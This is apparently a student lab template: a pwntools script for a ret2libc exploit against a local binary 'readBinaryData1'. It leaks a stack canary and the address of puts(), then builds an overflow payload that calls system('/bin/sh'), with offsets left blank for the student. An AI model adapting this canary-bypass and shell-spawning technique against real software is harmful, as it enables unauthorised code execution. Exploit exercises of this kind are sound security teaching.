from pwn import *
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# Number of bytes required to reach Return Address
BUF_SIZE = ??
log.info(f"Bytes until return address: {BUF_SIZE}")


# Number of bytes that our input buffer is
INPUT_SIZE = ??
log.info(f"Bytes for input: {INPUT_SIZE}")


# Special file name that will leak canary and hold our exploit
special_file = "?"


# Ignore this
junk = b"BBBB"


# ==== You can ignore this part ====
# We need to leak and save the canary value at runtime because it is different each time we execute 'readBinaryData0'
pty = process.PTY
io = process(argv=["./readBinaryData1", special_file], stdin=pty, stdout=pty)
leaks = io.recv()

# Keep the treasure! (address of 'puts()')
puts_addr = leaks.split(b'\n')[0].split()[-1].decode()
log.info(f"Address of 'puts()'! {puts_addr}")

# Get the canary
canary = leaks.split(b"0x41414141")[-1].split(b".")[1].decode()
log.info(f"Canary found! {canary}")
# ==== You can ignore this part ====


# Determine libc base address
libc_base = int(puts_addr, 16) - 0x????????
log.info(f"LIBC Base Addr! {hex(libc_base)}")


# Calculate real addr of 'system()' using 'libc_base'
system_returnAddress = libc_base + 0x????????
log.info(f"System() Addr! {hex(system_returnAddress)}")


# Address of 'exit()' - you can ignore this
#exit_addr = p32(0x????????)


# Addr of '/bin/sh' in libc - Placing '/bin/sh' on the stack DOES NOT WORK
command_str_addr = libc_base + 0x????????


# Crafting the final exploit!
exploit = b''
exploit += b"A" * (INPUT_SIZE)
exploit += p32(int(canary,16))
exploit += b"A" * (BUF_SIZE - INPUT_SIZE - 4) # '4' is the number of bytes the canary takes up
exploit += p32(system_returnAddress)
exploit += junk
exploit += p32(command_str_addr)


# Write exploit to a file as bytes (wb)
with open(special_file, "wb") as fd:
    fd.write(exploit)


# Continue program execution to make it read the file with our exploit!
io.sendline()
io.interactive()
